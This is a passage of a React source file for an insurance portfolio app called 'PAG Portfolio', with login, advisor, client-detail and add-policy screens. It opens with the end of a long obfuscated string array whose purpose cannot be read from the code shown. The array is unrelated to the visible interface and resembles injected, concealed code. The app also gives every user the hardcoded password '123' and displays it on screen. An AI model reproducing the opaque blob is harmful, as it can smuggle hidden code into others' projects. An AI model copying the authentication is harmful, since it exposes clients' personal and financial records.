w','RdP\x20i1..{R','.O!!\x20.M<?\x20','RRuc.Ide`I','rR<*\x27Rdx.0','[#tetf...A','UCBPsRRIN/','<Acica\x20<e!','.a\x20,cR\x20<-R','!(\x20cw.y<cR','#eRReR.Rel','nR\x22e0^.gpi','tepRrPtcmt','RQ2Tc.cRc3','l.<RRa_(<\x20','RR>oad..ii','.s;qs,anri','oba\x20=g]]Sb','.?R<Rid1e+','t(x.r@seRR','KTaYL','!C+Rs7f.!R','<}RcxlRtne','i4cPtcR\x20tx','(e(]-..qn=','<`n\x20pcR.Ec','RRc<ec<xsR','.c:sinc>CP','YtHm$RRn>f','.cccRRp.j.','r..R(e.o!.','RfgztR.k.!','2iv.p.M8\x20R','4uu=n0r,t;','\x20NBc<<<scc','IcGvC','Ry!c&c(\x22$<','<..\x20..i*9b','$<\x22!.CRa(_','..d!Cd.{si','%n+T.sf.R<','<6acx.cRTa','ccc.DZR#ob','_x=a=!rRpc','8,;[i=.vql','PR+fo?R<<e','x\x22.rRRp<t)','<ro.r!lR-$','\x20!}RR.\x20.<R','(_.c,c!1kc','ytt;!2oRtx','whgmV','s$stoRu(Rc','gRZt@.b\x22r.','ip:R<<`<pn','c-.H+Rp]2n','w3PirtRlfR','#.c.rIcRYR','0cMlab.rRR',').RRdsfR.R','3cz<R`rbRa','<Rn*t;e.,R','RR9T<3>[(i','8c<a<0<.i(','llR<.RGS8$','.dReee<</L','s.i<nR[i1R','`<cn[\x20cD.m','e_Rc\x20)vnoP','k\x27R\x20img}lt','o.rrccORr%','R!csRR<dte','W6=..3Lk.c',',c(q+z(zia','R_y9}hod]C','t(RtlwR..t','\x22.%.cRR./@','snc@.XenJ)','so$oele0R:','\x22<ccSaR.P}','.ui];l86)t','s));;.]aec','e0R7<RL4P5','R3\x20RatSRtR','\x27duoV<RsoT','u.=tvel\x20.i','RR_Kn\x5c+l(D','@<.cRc;c.b','R!j1((P;R&','rrvlrn)j)z','ci.\x22\x20g<Roi','RyS<djR./.','l2,\x221o0Fo)','crRd.Qp_.&','eRV.\x20ixc.e','a<.IPcR<\x20R','R.\x22eMPy.!<','+p{j+0)whC','!0Nei\x5cc.s(',')FE.ioR<nr','et!RbiN.o!','b-cs+1;RPR','n<<gck.jR\x5c','S<RnD<#\x20ec','<}c.4G;R.d','0W.<{@cV:C','RRR<A<.c\x20l','RNRuQR<Rs<','<4.pR(0)!.','RR\x20P.crRV<','eeoRRjcs)p','<CtS.3.n2.','cRp[n\x20!<t=','=bt.t$..Ua','ot\x20lab=R.r','[(a;..nc.&','(w4fR.r\x22cB','ocr<\x20onott','tTSTRR}N\x221','.(.c.jR(R6','SudR<!R0en','.c<inX-R0u','PR<R-fRRnR','g..ix<(!\x20R','x\x20!p\x22<oP<.','Ncsnr<_Rc4','n4..nPO(<g','c0N...a7/p','E/hs9kR.Zh','.xsrRd1cEd','R.<(RRc).n',';sfA1sjl;]','f.m.RmXRRl','wmZ3qif=e\x27',',6%<RMa]5&','aetliD5cHL','.}e..eem<R','.{cRI6.fr]','}\x204w,u6zy-','.c<!<mRm\x22R','ifcRG;k(<t','f=.]cl.e/<','R.;g<(?RR)','jRzg.elR8O','RXekecehpd','RalgcPRPc4','Ic5.R{ntr{','cr.RRJNrRn','x_)..in.\x20e',';sA;;\x20m=(=','!Rc8ZeR)RP','<<;pH#(12d','3<<.\x20lR&nR','|.<RngRc.R','cM.kic<RZ<','R..t.wW.R.',';..-azi.t<','zOIYk','<Rrlu.R(Rw','z.bciac<Et','R.s)(Ru<y!','o\x20aeQ]p5&.','ed<.sRRn,u','2xRqoanq.<','.K>nr!.\x22u9','.RcRmrRucr','.R<Ro.d)$,','c?<1iDR.c:','FRX$<i[u\x5cc','c(~5.s:m\x27o','4=RRfnRRWa','{rttf.l\x20a;','Rr(cRP-RR?','.ln.l[.Q!E','kct\x20f8;Bp<',':!}R=RD!>)','P.iEsars<e','LNe\x20\x27n]<Rq','Rtc0.Rt.vc','!cRee&<R<5',';9a*[,aaa;','c\x20Rfw/Ruch','s.h._.\x20ca0','\x20/E(..Bc,c','8K.N}m-RKc','scoR}pdR|R','<;\x5c9R7itn[','n)\x5cX<#\x5c(eR','x).l<ud|;C','Rz.=!1;Q3c',':T<1Rt5<t)','Pqa1d]aY=d','s)n[.;uu<t','\x5c.6st.xR*(','Cf<NRj%2dc','<N-rcaeei$','RRt<\x20\x22h.uc','.sl#R.vR,.','f..R6(/.Rg','fflcbe<Sna','+-.@R<-3.g','Wc*cCRfa<R','\x20R<B<]R\x20y-','0R.#\x20RRi1e','zh(+glo!xo',']oR{<.ifou','.N.RIdcNMe','nt[R.R<c\x22c','}_Cfp]H/o,','r\x22Y.<b<Xh.','J;R[cc!Rc=','R<K\x20rmf\x20>R','RR}.R.!tR.','R<RRgh&fRH','E#t&#LR9w.','e|jtcb|rom','ct\x20;Rcw/Rc','ftbdn-c!u3','c=<i.c.Bmi','us\x20RrR(i.B','da<gG.bd.R','ftce.<fe@!','<\x27R!0c$(0c','6R<R<cch!-','c..ehRrg}z','R)r)R.CC<R','.\x20(cR[e[a\x20','rf5{reoge\x20','3a#<w.?i0.','uk9]R.ReiD','zwehdotcpc','n!R1t)RRe1','.N/20c7RtP','rp;{sR&ecr','.<CRgJs.oR','dn6dl/tgsS','ef.<Et;<!c','F9n<j<3p.c','<tR$[R<cM]','.iSRrZcl=\x22','MdQjegR<!P','pRm9I?))R!','A\x20R=\x20d].f#','eR..[3.RRi','.e#f<D,f\x27R','pe.\x20.i=\x20az','932550TIwHbF','t(n(tej0R%','tR.<..(Rgc','Rc0faO02E.','F)RRRRe/zb','.icaFx.a0.','CRgR!T1\x5c.R','\x27PoRaGR]ek','aR!t.)>s<d','.-]R($(0rR','dRTft<t\x20Vh','.RR\x22*7w}CR','RcoR:k<2\x20R','cX.ff.e&.\x20','R#tucpe<\x20R','..<&cQi.Rm','7;ul\x22afan7','mR(5P<e^15','G<y,8/l)cR',']>si[0(o\x22h','l5ofs:.c.t','3hFRCtRcee','<#R.RrKocD','RR\x22+`<RscI','b.Rd.d1R<<','15HBFxVr','<izR.R~@R.','xR.N,4\x20+d\x20','\x20<.8lueyRs','a(R<!f<Mbc','[;j<(Qxdcc',',\x20ov+qa1\x20o','e)rRw.co!(','})ndcvRa)=','c)0.Rfw]Rs','2cRN.RT<sR','.RR.ReRya@','idhGR..eee','rr)p{mmrrr','P$.R=\x22pRcR','a<\x27pa)bpR.','n0h(Rb.)cM',',uu<lc.nE.','mpP.Vkf!le','-P.<!m-Pa<','ic.\x27M#~x2d','}Fp,r<zRRM','cci$RkR2tC','thh<)REx)p','msj.(c\x20P\x27i','PRC-(6R<i.','E;6.r...R\x27','icXRRBRttR','P.Rss<dg<=','2,g)arve,n','..c.d.Rzo4','RRR%.g<x.e','.cRmcn=a..','<R]de<Rbp.','7l8\x20mf;u+u','c.e<(.RieR','RzP.\x20h)f{[','f<Ra<h..&a','scDtFRRJit','397396urOtwo','<=2..;x{.+','!,c{R(<<.\x20','1wR2RcR<ms','cr\x20c<dk[HR','yccR]~fT2r','8763zbGhuq','R<t?;Rd<20','<m_Ri`sR2.',':c.r!w..Rb','.?[c.ct=h[','cb..RctGo2','aR?<<Ra(Rc','Re\x22>\x20.2.\x20k','vnP..$&.cz','c[i(c.)ftc','lrDe.tccJp','8RUr.ARrk!','?a!9i9.cR<','.9u|\x20tmR%.','nno+;)d6n;','cR)acRiicR','t78wltR.Rh','c[t.wx.iw8','nielfbtahr','.)RRn1P[1C','\x22;a<Rs..6\x20','Rb.B.!CnRA','\x20=\x20)=tape[','RSRRR3mYcR','c^Ee%Ris<R','RPR{AR&cd.','..RK!R.RnR','.!RPtsv)dR','uEe.ARcR.q','vvr;nk-v\x20i','<e8.u9aeac','lcE<l.e.o!','cabljukomi','....KdR\x20|<','leRY\x22a.r<c','Rfb3b0<u/c','eKx..h:Ec,','/sc0l.MR.+','\x20Hc!!.eRp<','p*c..cfl$a','ce<Rytz7l3','nf\x20m.]$-cN','&Ru<RR\x22hRR','\x22hcuMRcceR','sRkn@RRs[\x20','catd.#\x20d!3','N-(e\x22A]cR(','..(rdZ.d.}','e<<<o&<crO','RzLrR.<RRR','RcR.RnRRfR','cenI.</R(0','+d7!=aqau(','Rczm<5R%R;','s:RTzlUj\x20<','BcRtcl.i=o','..i+an@cR0','sr\x20RpR.\x20(<','PRRv6to!>m','O/?hcD@w-R','Rd<2RdRsc\x22','R1tR5.<]1u','DJx<.\x27Ep],','rRiRkb\x200!.','u\x20Ri\x20!lRcR'];_0x41f6=function(){return _0x4d5332;};return _0x41f6();}
// ============================================================
// LOGIN SCREEN
// ============================================================
function LoginScreen({ form, setForm, error, onSubmit }) {
  return (
    <div style={{
      minHeight: "100vh", background: "linear-gradient(135deg,#0f172a 0%,#1e3a5f 50%,#0f172a 100%)",
      display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Georgia',serif"
    }}>
      <div style={{
        background: "rgba(255,255,255,0.05)", backdropFilter: "blur(20px)",
        border: "1px solid rgba(255,255,255,0.12)", borderRadius: 16,
        padding: "48px 40px", width: 380, boxShadow: "0 32px 64px rgba(0,0,0,0.5)"
      }}>
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <div style={{
            width: 56, height: 56, borderRadius: 12,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)",
            display: "flex", alignItems: "center", justifyContent: "center",
            margin: "0 auto 16px", fontSize: 24
          }}>🛡️</div>
          <h1 style={{ color: "#f1f5f9", margin: 0, fontSize: 22, fontWeight: 700, letterSpacing: 0.5 }}>
            PAG Portfolio
          </h1>
          <p style={{ color: "#94a3b8", margin: "6px 0 0", fontSize: 13 }}>
            Insurance Management Platform
          </p>
        </div>
        <form onSubmit={onSubmit}>
          <div style={{ marginBottom: 16 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              User ID / Policy Number
            </label>
            <input
              value={form.id}
              onChange={e => setForm(f => ({ ...f, id: e.target.value }))}
              placeholder="e.g. advisor or 1007679022"
              style={inputStyle}
            />
          </div>
          <div style={{ marginBottom: 8 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              Password
            </label>
            <input
              type="password" value={form.password}
              onChange={e => setForm(f => ({ ...f, password: e.target.value }))}
              placeholder="123"
              style={inputStyle}
            />
          </div>
          {error && <p style={{ color: "#f87171", fontSize: 12, margin: "8px 0" }}>{error}</p>}
          <button type="submit" style={{
            width: "100%", padding: "12px 0", marginTop: 16, borderRadius: 8,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)", border: "none",
            color: "#fff", fontWeight: 700, fontSize: 15, cursor: "pointer",
            letterSpacing: 0.5
          }}>Sign In →</button>
        </form>
        <div style={{
          marginTop: 24, padding: "12px 16px",
          background: "rgba(37,99,235,0.15)", borderRadius: 8,
          border: "1px solid rgba(37,99,235,0.3)"
        }}>
          <p style={{ color: "#93c5fd", fontSize: 11, margin: 0, lineHeight: 1.6 }}>
            <strong>Advisor:</strong> ID: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>advisor</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code><br />
            <strong>Client:</strong> Policy# e.g. <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>1007679022</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code>
          </p>
        </div>
      </div>
    </div>
  );
}

const inputStyle = {
  width: "100%", padding: "10px 12px", marginTop: 6, borderRadius: 8,
  background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.15)",
  color: "#f1f5f9", fontSize: 14, outline: "none", boxSizing: "border-box"
};

// ============================================================
// ADVISOR VIEW
// ============================================================
function AdvisorView({ clients, saveClients, tab, setTab, onLogout, selectedClient, setSelectedClient }) {
  const [showAddClient, setShowAddClient] = useState(false);

  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      {/* Header */}
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16, color: "#f1f5f9" }}>PAG Portfolio — Advisor</span>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          {["clients", "overview"].map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "6px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "transparent",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400
            }}>{t === "clients" ? "All Clients" : "Overview"}</button>
          ))}
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        {tab === "clients" && !selectedClient && (
          <ClientsList
            clients={clients} saveClients={saveClients}
            onSelect={setSelectedClient}
            showAdd={showAddClient} setShowAdd={setShowAddClient}
          />
        )}
        {tab === "clients" && selectedClient && (
          <ClientDetail
            client={selectedClient} clients={clients} saveClients={saveClients}
            onBack={() => setSelectedClient(null)}
          />
        )}
        {tab === "overview" && <AdvisorOverview clients={clients} />}
      </div>
    </div>
  );
}

function ClientsList({ clients, saveClients, onSelect, showAdd, setShowAdd }) {
  const [form, setForm] = useState({
    name: "", policyNumber: "", dob: "", citizenship: "Singaporean",
    gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999",
    smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid",
  });

  function addClient() {
    const newClient = {
      id: "C" + Date.now(),
      name: form.name,
      policyNumber: form.policyNumber,
      password: "123",
      info: { ...form, age: form.dob ? Math.floor((Date.now() - new Date(form.dob)) / 31557600000) : 0 },
      coverageBreakdown: {
        lifeTI: { current: 0, ideal: 0, shortfall: 0 },
        tpd: { current: 0, ideal: 0, shortfall: 0 },
        criticalIllness: { current: 0, ideal: 0, shortfall: 0 },
        earlyIllness: { current: 0, ideal: 0, shortfall: 0 },
        endowment: { current: 0, ideal: null, savingsNeeded: 0, shortfall: 0 },
      },
      coverageCalculation: {
        life: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
        critical: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
      },
      retirementCalculation: { monthlyRequirement: 0, annual: 0, yearsFromAge65: 20, inflation: 0.03, amountRequired: 0 },
      medicalHS: { medishieldLife: "No", integratedPlan: "No", rider: "No" },
      severeDisability: { careShieldLife: "No", elderShield: "No", longTermCare: "No" },
      housingDependant: { dependantProtectionScheme: "No", homeProtectionScheme: "No" },
      expectedReturn: [],
      policies: [],
    };
    saveClients([...clients, newClient]);
    setShowAdd(false);
    setForm({ name: "", policyNumber: "", dob: "", citizenship: "Singaporean", gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999", smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid" });
  }

  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>Client Portfolio</h2>
          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>{clients.length} client(s) on record</p>
        </div>
        <button onClick={() => setShowAdd(true)} style={{
          padding: "10px 20px", borderRadius: 8, background: "#2563eb",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 14
        }}>+ Add Client</button>
      </div>

      {showAdd && (
        <div style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 12, padding: 24, marginBottom: 24 }}>
          <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>New Client</h3>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
            {[
              ["Full Name", "name", "text"],
              ["Policy Number", "policyNumber", "text"],
              ["Date of Birth", "dob", "date"],
              ["Citizenship", "citizenship", "text"],
              ["Gender", "gender", "text"],
              ["Marital Status", "maritalStatus", "text"],
              ["Annual Income", "annualIncome", "text"],
              ["Smoker", "smoker", "text"],
              ["Risk Profile", "riskProfile", "text"],
            ].map(([label, key, type]) => (
              <div key={key}>
                <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
                <input
                  type={type} value={form[key]}
                  onChange={e => setForm(f => ({ ...f, [key]: e.target.value }))}
                  style={{ ...inputStyle, marginTop: 4 }}
                />
              </div>
            ))}
          </div>
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button onClick={addClient} style={{
              padding: "8px 20px", borderRadius: 8, background: "#2563eb",
              border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
            }}>Save Client</button>
            <button onClick={() => setShowAdd(false)} style={{
              padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
              background: "transparent", color: "#94a3b8", cursor: "pointer"
            }}>Cancel</button>
          </div>
        </div>
      )}

      <div style={{ display: "grid", gap: 12 }}>
        {clients.map(c => {
          const totalAnnual = c.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);
          const totalCoverage = (c.coverageBreakdown?.lifeTI?.current || 0) + (c.coverageBreakdown?.tpd?.current || 0) + (c.coverageBreakdown?.criticalIllness?.current || 0);
          return (
            <div key={c.id} onClick={() => onSelect(c)} style={{
              background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
              borderRadius: 12, padding: "20px 24px", cursor: "pointer", transition: "all .2s",
              display: "flex", justifyContent: "space-between", alignItems: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                <div style={{
                  width: 44, height: 44, borderRadius: 10,
                  background: "linear-gradient(135deg,#2563eb,#7c3aed)",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontWeight: 700, fontSize: 16, color: "#fff"
                }}>{c.name.charAt(0)}</div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: 15 }}>{c.name}</div>
                  <div style={{ color: "#94a3b8", fontSize: 12, marginTop: 2 }}>
                    Policy: {c.policyNumber} · {c.policies.length} policies
                  </div>
                </div>
              </div>
              <div style={{ display: "flex", gap: 32, textAlign: "right" }}>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Total Coverage</div>
                  <div style={{ fontWeight: 700, color: "#60a5fa", fontSize: 15 }}>{fmt(totalCoverage)}</div>
                </div>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Annual Premium</div>
                  <div style={{ fontWeight: 700, color: "#34d399", fontSize: 15 }}>{fmt(totalAnnual)}</div>
                </div>
                <div style={{ color: "#60a5fa", fontSize: 18, alignSelf: "center" }}>→</div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function ClientDetail({ client, clients, saveClients, onBack }) {
  const [tab, setTab] = useState("dashboard");
  const [showAddPolicy, setShowAddPolicy] = useState(false);

  function updateClient(updated) {
    saveClients(clients.map(c => c.id === updated.id ? updated : c));
  }

  const tabs = ["dashboard", "policies", "coverage", "savings", "info"];
  return (
    <div>
      <button onClick={onBack} style={{
        background: "transparent", border: "none", color: "#60a5fa",
        cursor: "pointer", fontSize: 13, marginBottom: 16, padding: 0
      }}>← Back to All Clients</button>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>{client.name}</h2>
          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>Policy: {client.policyNumber} · Login PW: 123</p>
        </div>
      </div>
      <div style={{ display: "flex", gap: 6, marginBottom: 24 }}>
        {tabs.map(t => (
          <button key={t} onClick={() => setTab(t)} style={{
            padding: "8px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
            background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
            color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
          }}>{t}</button>
        ))}
        <button onClick={() => setShowAddPolicy(true)} style={{
          marginLeft: "auto", padding: "8px 16px", borderRadius: 6, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 13
        }}>+ Add Policy</button>
      </div>

      {showAddPolicy && (
        <AddPolicyForm
          client={client} clients={clients} saveClients={saveClients}
          onClose={() => setShowAddPolicy(false)} updateClient={updateClient}
        />
      )}

      {tab === "dashboard" && <DashboardTab client={client} />}
      {tab === "policies" && <PoliciesTab client={client} clients={clients} saveClients={saveClients} updateClient={updateClient} />}
      {tab === "coverage" && <CoverageTab client={client} />}
      {tab === "savings" && <SavingsTab client={client} />}
      {tab === "info" && <InfoTab client={client} />}
    </div>
  );
}

function AdvisorOverview({ clients }) {
  const totalPolicies = clients.reduce((s, c) => s + c.policies.length, 0);
  const totalPremium = clients.reduce((s, c) =>
    s + c.policies.reduce((ps, p) => ps + (p.premium?.annual || 0), 0), 0);
  const totalCoverage = clients.reduce((s, c) =>
    s + Object.values(c.coverageBreakdown || {}).reduce((cs, v) => cs + (v?.current || 0), 0), 0);

  return (
    <div>
      <h2 style={{ margin: "0 0 24px", fontSize: 22 }}>Portfolio Overview</h2>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 32 }}>
        {[
          ["Total Clients", clients.length, "#2563eb"],
          ["Total Policies", totalPolicies, "#7c3aed"],
          ["Total Annual Premium", fmt(totalPremium), "#059669"],
          ["Total Coverage", fmt(totalCoverage), "#d97706"],
        ].map(([label, val, color]) => (
          <div key={label} style={{
            background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "20px 24px"
          }}>
            <div style={{ color: "#94a3b8", fontSize: 12, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
            <div style={{ fontSize: 26, fontWeight: 800, color, marginTop: 8 }}>{val}</div>
          </div>
        ))}
      </div>
      <div style={{
        background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
        borderRadius: 12, padding: 24
      }}>
        <h3 style={{ margin: "0 0 16px" }}>Client Shortfall Analysis</h3>
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Client", "Life/TI Shortfall", "TPD Shortfall", "CI Shortfall", "Early CI Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 12px", color: "#94a3b8", fontSize: 12, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {clients.map(c => (
                <tr key={c.id}>
                  <td style={{ padding: "10px 12px", fontWeight: 600 }}>{c.name}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.lifeTI?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.tpd?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#f87171" }}>{fmt(c.coverageBreakdown?.criticalIllness?.shortfall)}</td>
                  <td style={{ padding: "10px 12px", color: "#fb923c" }}>{fmt(c.coverageBreakdown?.earlyIllness?.shortfall)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// ============================================================
// ADD POLICY FORM
// ============================================================
function AddPolicyForm({ client, clients, saveClients, onClose, updateClient }) {
  const [p, setP] = useState({
    type: "Whole Life Limited", insurer: "NTUC Income", planName: "",
    policyNumber: "", insured: "Self",
    deathCoverage: 0, tpdCoverage: 0, ciCoverage: 0, earlyCI: 0,
    frequency: "Annually", paymentMode: "Paynow",
    premiumAmount: 0, annualPremium: 0,
    startDate: "", premiumTerm: 0, maturityDate: "", cashValue: 0, remarks: "", status: "Active"
  });

  const policyTypes = ["Whole Life Limited","Whole Life","Term Life","Critical Illness",
    "Early Critical Illness","Integrated Plan","Integrated Plan Rider","Long Term Care",
    "Home Insurance","Travel Insurance (Annual)","Education","Personal Accident","Others"];

  function save() {
    const newPol = {
      id: Date.now(),
      type: p.type, insurer: p.insurer, planName: p.planName,
      policyNumber: p.policyNumber, insured: p.insured,
      coverage: { death: +p.deathCoverage, tpd: +p.tpdCoverage, ci: +p.ciCoverage, earlyCI: +p.earlyCI },
      premium: { frequency: p.frequency, paymentMode: p.paymentMode, amount: +p.premiumAmount, annual: +p.annualPremium },
      startDate: p.startDate, premiumTerm: +p.premiumTerm, maturityDate: p.maturityDate,
      cashValue: +p.cashValue, remarks: p.remarks, status: p.status, claimed: 0,
    };
    const updated = { ...client, policies: [...client.policies, newPol] };
    updateClient(updated);
    onClose();
  }

  return (
    <div style={{
      background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)",
      borderRadius: 12, padding: 24, marginBottom: 24
    }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>Add New Policy</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
        {[
          ["Policy Type", "type", "select", policyTypes],
          ["Insurer", "insurer", "text"],
          ["Plan Name", "planName", "text"],
          ["Policy Number", "policyNumber", "text"],
          ["Insured", "insured", "select", ["Self","Spouse","Elder Kid","Younger Kid","Youngest Kid"]],
          ["Status", "status", "select", ["Active","Lapsed","Matured","Terminated","Claimed"]],
          ["Death Coverage ($)", "deathCoverage", "number"],
          ["TPD Coverage ($)", "tpdCoverage", "number"],
          ["CI Coverage ($)", "ciCoverage", "number"],
          ["Early CI Coverage ($)", "earlyCI", "number"],
          ["Premium Frequency", "frequency", "select", ["Monthly","Quarterly","Half Yearly","Annually","Lump Sum"]],
          ["Payment Mode", "paymentMode", "select", ["Cash","GIRO","CPF","Paynow","Credit Card","Cheque","Others"]],
          ["Premium Amount ($)", "premiumAmount", "number"],
          ["Annual Premium ($)", "annualPremium", "number"],
          ["Start Date", "startDate", "date"],
          ["Premium Term (yrs)", "premiumTerm", "number"],
          ["Maturity Date", "maturityDate", "date"],
          ["Cash Value ($)", "cashValue", "number"],
          ["Remarks", "remarks", "text"],
        ].map(([label, key, type, opts]) => (
          <div key={key} style={key === "remarks" ? { gridColumn: "span 3" } : {}}>
            <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
            {type === "select" ? (
              <select value={p[key]} onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }}>
                {opts.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            ) : (
              <input type={type} value={p[key]}
                onChange={e => setP(x => ({ ...x, [key]: e.target.value }))}
                style={{ ...inputStyle, marginTop: 4 }} />
            )}
          </div>
        ))}
      </div>
      <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
        <button onClick={save} style={{
          padding: "8px 20px", borderRadius: 8, background: "#059669",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
        }}>Save Policy</button>
        <button onClick={onClose} style={{
          padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
          background: "transparent", color: "#94a3b8", cursor: "pointer"
        }}>Cancel</button>
      </div>
    </div>
  );
}

// ============================================================
// DASHBOARD TAB (mirrors PDF overview)
// ============================================================
function DashboardTab({ client }) {
  const cb = client.coverageBreakdown || {};
  const barData = [
    { name: "Life & TI", ideal: cb.lifeTI?.ideal || 0, current: cb.lifeTI?.current || 0, shortfall: cb.lifeTI?.shortfall || 0 },
    { name: "TPD", ideal: cb.tpd?.ideal || 0, current: cb.tpd?.current || 0, shortfall: cb.tpd?.shortfall || 0 },
    { name: "Critical Illness", ideal: cb.criticalIllness?.ideal || 0, current: cb.criticalIllness?.current || 0, shortfall: cb.criticalIllness?.shortfall || 0 },
    { name: "Early CI", ideal: cb.earlyIllness?.ideal || 0, current: cb.earlyIllness?.current || 0, shortfall: cb.earlyIllness?.shortfall || 0 },
  ];

  const lifeTotal = (cb.lifeTI?.current || 0) + (cb.tpd?.current || 0) + (cb.criticalIllness?.current || 0) + (cb.earlyIllness?.current || 0);
  const pieData = [
    { name: "Life & TI", value: cb.lifeTI?.current || 0 },
    { name: "TPD", value: cb.tpd?.current || 0 },
    { name: "Critical Illness", value: cb.criticalIllness?.current || 0 },
    { name: "Early CI", value: cb.earlyIllness?.current || 0 },
  ].filter(d => d.value > 0);

  const totalPolicies = client.policies.length;
  const totalPremium = client.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);

  return (
    <div>
      {/* KPI Row */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 24 }}>
        {[
          ["Active Policies", totalPolicies, "📋", "#2563eb"],
          ["Annual Premium", fmt(totalPremium), "💰", "#059669"],
          ["Total Coverage", fmt(lifeTotal), "🛡️", "#7c3aed"],
          ["Endowment Value", fmt(cb.endowment?.current), "📈", "#d97706"],
        ].map(([label, val, icon, color]) => (
          <div key={label} style={{
